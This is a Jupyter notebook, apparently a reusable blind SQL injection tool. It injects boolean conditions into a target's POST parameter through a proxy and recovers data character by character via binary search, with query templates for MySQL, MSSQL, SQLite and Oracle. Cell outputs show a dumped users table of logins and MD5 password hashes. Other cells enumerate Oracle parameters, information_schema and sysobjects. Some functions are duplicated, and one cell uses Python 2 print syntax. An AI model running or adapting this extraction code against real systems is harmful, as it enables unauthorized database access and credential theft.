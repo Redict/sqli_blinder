{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "#from requests_ntlm import HttpNtlmAuth\n",
    "import json\n",
    "from concurrent.futures import ThreadPoolExecutor\n",
    "import threading\n",
    "from threading import current_thread\n",
    "from tqdm import tqdm_notebook\n",
    "import re\n",
    "import os"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You have to just define:\n",
    "1. Url with %s where to inject strings ' and 1=1 ' and ' and 1=0 ' and they work\n",
    "2. response true_or false in get_bool\n",
    "3. Multithreading options"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'username=administrator&password=xyz'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from urllib.parse import urlencode, quote_plus\n",
    "\n",
    "payload = {'username':'administrator', 'password':'xyz'}\n",
    "result = urlencode(payload, quote_via=quote_plus)\n",
    "result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "multithreaded = True\n",
    "threads = 16\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "http_proxy   = \"http://localhost:8080\"\n",
    "\n",
    "proxyDict = { \n",
    "             \"https\"   : http_proxy,    \n",
    "             \"http\"   : http_proxy\n",
    "            }\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 233,
   "metadata": {},
   "outputs": [],
   "source": [
    "threadLocal = None\n",
    "\n",
    "def make_request(to_paste):\n",
    "\n",
    "    burp0_cookies = {\"JSESSIONID\": cookie}\n",
    "    burp0_url = \"http://xxxx\"\n",
    "    burp0_headers = {}\n",
    "    burp0_data = {\"xxx\":\"fefe:%s\"%to_paste}\n",
    "    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxyDict)\n",
    "\n",
    "    return r\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 191,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "def get_bool(sql):\n",
    "    while True:\n",
    "        to_paste = sql\n",
    "        r = make_request(to_paste)\n",
    "        #print (r.text)\n",
    "\n",
    "        if r.status_code != 200:\n",
    "            raise Exception('code: %d, ошибка sql: %s'%(r.status_code,sql))\n",
    "        if \"You can't access information about\" not in r.text:\n",
    "            raise Exception('code: %d, ошибка sql: %s'%(r.status_code,sql))\n",
    "        if \"You can't access information about test\" in r.text:\n",
    "            return True\n",
    "        else:\n",
    "            return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 179,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "False\n"
     ]
    }
   ],
   "source": [
    "#for check\n",
    "print (get_bool('1=1'))\n",
    "print (get_bool('1=0'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "DBMS = 'oracle' #'mssql')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [],
   "source": [
    "#MySQL\n",
    "if DBMS == 'mysql':\n",
    "    base_from_clause = 'FROM {table_name} {where} ORDER BY {column_name} limit 1 offset {row_num}'\n",
    "    string_definition = 'SELECT %s'\n",
    "    string_len_definition = 'SELECT length(%s)'\n",
    "    string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'\n",
    "    count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'\n",
    "    offset_shift=0\n",
    "\n",
    "#MSSQL\n",
    "if DBMS == 'mssql':\n",
    "    base_from_clause = 'FROM (SELECT *, ROW_NUMBER() OVER(ORDER by [{column_name}])n FROM {table_name} {where})T WHERE n={row_num}'\n",
    "    string_definition = 'SELECT %s'\n",
    "    string_len_definition = 'SELECT len(%s)'\n",
    "    string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'\n",
    "    count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'\n",
    "    offset_shift=1\n",
    " \n",
    "#SQLITE\n",
    "if DBMS == 'sqlite':\n",
    "    base_from_clause = 'FROM {table_name} {where} ORDER BY {column_name} limit 1 offset {row_num}'\n",
    "    string_definition = 'SELECT %s'\n",
    "    string_len_definition = 'SELECT length(%s)'\n",
    "    #string_char_definition = 'SELECT unicode(SUBSTR(%s,%d,1))' #unicode doesn't work always\n",
    "    string_char_definition = 'SELECT hex(SUBSTR(%s,%d,1))'\n",
    "    count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'\n",
    "    offset_shift=0\n",
    "    \n",
    "#oracle\n",
    "if DBMS == 'oracle':\n",
    "    base_from_clause = 'FROM (SELECT a.*, ROWNUM rn FROM {table_name} a {where} ORDER BY a.{column_name}) WHERE rn={row_num}'\n",
    "    string_definition = 'SELECT %s'\n",
    "    string_len_definition = 'SELECT LENGTH(%s)'\n",
    "    string_char_definition = 'SELECT ASCII(SUBSTR(%s,%d,1))'\n",
    "    count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'\n",
    "    offset_shift=1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "def define_string(table_name,column_name,index):\n",
    "    return string_definition%(column_name) + ' ' + get_from_clause(table_name,column_name,index)\n",
    "\n",
    "def get_from_clause(table_name,column_name,index,where=None):\n",
    "    to_where = ''\n",
    "    if where != None:\n",
    "        to_where = 'WHERE '+where\n",
    "    return base_from_clause.format(column_name = column_name,table_name = table_name,where = to_where,row_num = index)\n",
    "\n",
    "def define_string_len(table_name,column_name,index,where=None):\n",
    "    return string_len_definition%(column_name)+ ' ' + get_from_clause(table_name,column_name,index,where)\n",
    "\n",
    "def define_string_char(table_name,column_name,index,string_pos,where=None):\n",
    "    return string_char_definition%(column_name,string_pos) + ' ' + get_from_clause(table_name,column_name,index,where)\n",
    "\n",
    "def define_count(table_name,where=None):\n",
    "    to_where = ''\n",
    "    if where != None:\n",
    "        to_where = 'WHERE '+where\n",
    "    return count_definition%(table_name,to_where)\n",
    "\n",
    "def build_sql_binary_query(query,value,search_for_number):\n",
    "    if (DBMS == 'sqlite') and (search_for_number==False):\n",
    "        return \"(%s)>=hex(char(%s))\" % (query,value) #this is cause ' was banned in task, but works always\n",
    "    else:\n",
    "        return '(%s)>=%d' %(query,value)\n",
    "\n",
    "def binary_search(s,start_val,start_val_defined=False,search_for_number=False): #start_val should be power of 2\n",
    "    #define real_start_val:\n",
    "    if not start_val_defined:\n",
    "        while True:\n",
    "            sql = build_sql_binary_query(s,start_val-1,search_for_number)\n",
    "            #print sql\n",
    "            r = get_bool(sql)\n",
    "            if r:\n",
    "                start_val*=8\n",
    "            else:\n",
    "                break\n",
    "    #now start_val > len\n",
    "    cur_val = start_val/2\n",
    "    move = start_val/4\n",
    "    while True:\n",
    "        sql = build_sql_binary_query(s,cur_val,search_for_number)\n",
    "        #print sql\n",
    "        r = get_bool(sql)\n",
    "        #print r\n",
    "        if move<1:\n",
    "            if r:\n",
    "                return int(cur_val)\n",
    "            else:\n",
    "                return int(cur_val-1)\n",
    "        if r: #(cur_val+1 - cur_val+2*move)\n",
    "            cur_val+=move\n",
    "        else:\n",
    "            cur_val-=move\n",
    "        move = move/2\n",
    "    \n",
    "\n",
    "def get_from_clause(table_name,column_name,index,where=None):\n",
    "    to_where = ''\n",
    "    if where != None:\n",
    "        to_where = 'WHERE '+where\n",
    "    return base_from_clause.format(column_name = column_name,table_name = table_name,where = to_where,row_num = index)\n",
    "\n",
    "def define_string_len(table_name,column_name,index,where=None):\n",
    "    return string_len_definition%(column_name)+ ' ' + get_from_clause(table_name,column_name,index,where)\n",
    "\n",
    "def define_string_char(table_name,column_name,index,string_pos,where=None):\n",
    "    return string_char_definition%(column_name,string_pos) + ' ' + get_from_clause(table_name,column_name,index,where)\n",
    "\n",
    "def define_count(table_name,where=None):\n",
    "    to_where = ''\n",
    "    if where != None:\n",
    "        to_where = 'WHERE '+where\n",
    "    return count_definition%(table_name,to_where)\n",
    "\n",
    "def build_sql_binary_query(query,value,search_for_number):\n",
    "    if (DBMS == 'sqlite') and (search_for_number==False):\n",
    "        return \"(%s)>=hex(char(%s))\" % (query,value) #this is cause ' was banned in task, but works always\n",
    "    else:\n",
    "        return '(%s)>=%d' %(query,value)\n",
    "\n",
    "def binary_search(s,start_val,start_val_defined=False,search_for_number=False): #start_val should be power of 2\n",
    "    #define real_start_val:\n",
    "    if not start_val_defined:\n",
    "        while True:\n",
    "            sql = build_sql_binary_query(s,start_val-1,search_for_number)\n",
    "            #print sql\n",
    "            r = get_bool(sql)\n",
    "            if r:\n",
    "                start_val*=8\n",
    "            else:\n",
    "                break\n",
    "    #now start_val > len\n",
    "    cur_val = start_val/2\n",
    "    move = start_val/4\n",
    "    while True:\n",
    "        sql = build_sql_binary_query(s,cur_val,search_for_number)\n",
    "        #print sql\n",
    "        r = get_bool(sql)\n",
    "        #print r\n",
    "        if move<1:\n",
    "            if r:\n",
    "                return int(cur_val)\n",
    "            else:\n",
    "                return int(cur_val-1)\n",
    "        if r: #(cur_val+1 - cur_val+2*move)\n",
    "            cur_val+=move\n",
    "        else:\n",
    "            cur_val-=move\n",
    "        move = move/2\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 156,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_count(table_name,where=None):\n",
    "    s = define_count(table_name,where)\n",
    "    return binary_search(s,32,False,True)\n",
    "    \n",
    "\n",
    "def get_length_of_string(table_name,column_name,index,where=None):  \n",
    "    s = define_string_len(table_name,column_name,index,where)\n",
    "    return binary_search(s,32,False,True)\n",
    "\n",
    "def get_char(table_name,column_name,index,str_pos,where=None):\n",
    "    s = define_string_char(table_name,column_name,index,str_pos,where)\n",
    "    return chr(binary_search(s,256,True))\n",
    "\n",
    "def get_char_for_pool(chunk):\n",
    "    return get_char(*chunk)\n",
    "\n",
    "def get_string(table_name,column_name,index,where=None):\n",
    "    l = get_length_of_string(table_name,column_name,index,where)\n",
    "    print ('length: %d' % l)\n",
    "    r = ''\n",
    "    if not multithreaded:\n",
    "        for i in range(l):\n",
    "            r+=get_char(table_name,column_name,index,i+1,where)\n",
    "            #print r\n",
    "        return r\n",
    "    else:\n",
    "        with ThreadPoolExecutor(max_workers=threads) as pool:\n",
    "            r = ''.join(list(pool.map(get_char_for_pool,[(table_name,column_name,index,i+1,where) for i in range(l)])))\n",
    "            return r\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 239,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "CPU times: user 22.5 ms, sys: 5.96 ms, total: 28.5 ms\n",
      "Wall time: 846 ms\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "threads=16\n",
    "multithreaded=True\n",
    "print (get_count('v$version',where=\"1=1\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 242,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "length: 0\n",
      "\n",
      "CPU times: user 26.1 ms, sys: 4.88 ms, total: 31 ms\n",
      "Wall time: 910 ms\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "threads=16\n",
    "multithreaded=True\n",
    "threadLocal = threading.local()\n",
    "print (get_string(\"UTL_INADDR.get_host_address('xxx')\",'dual',1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 234,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "count 0\n",
      "[]\n",
      "CPU times: user 28.8 ms, sys: 17.2 ms, total: 45.9 ms\n",
      "Wall time: 1.1 s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "threads=32\n",
    "multithreaded=True\n",
    "threadLocal = threading.local()\n",
    "print (get(['value'],'v$parameter2',where=\"name = 'utl_file_dir'\")) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get(columns,table_name,where=None):\n",
    "    count = get_count(table_name,where)\n",
    "    print ('count %d' % count)\n",
    "    res = []\n",
    "    for i in range(count):\n",
    "        cs = []\n",
    "        for column in columns:\n",
    "            cs.append(get_string(table_name,column,i+offset_shift,where))\n",
    "        print (cs)\n",
    "        res.append(cs)\n",
    "    return res"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[['a', '098f6bcd4621d373cade4e832627b4f6'],\n",
       " ['admin', '0d63031864eaeeab8baf66bee4e9c3b9'],\n",
       " ['cth', '202cb962ac59075b964b07152d234b70'],\n",
       " ['test', '3590cb8af0bbb9e78c343b52b93773c9'],\n",
       " ['testtest', '60ac7bc37d05b4dbac42ebffd9e76a74']]"
      ]
     },
     "execution_count": 92,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "get(['login','pass'],'users')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "columns = {}\n",
    "for t in tables:\n",
    "    t = t[0]\n",
    "    r = get(['column_name'],'information_schema.columns',\"table_name='%s'\"%t)\n",
    "    columns[t]=r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "userTab = get(['FIO','UserName'],'temp_User')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "get_count('sysobjects')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_tables = get(['name'],'sysobjects')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print get_string('temp_User','UserName',1).decode('cp1251')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
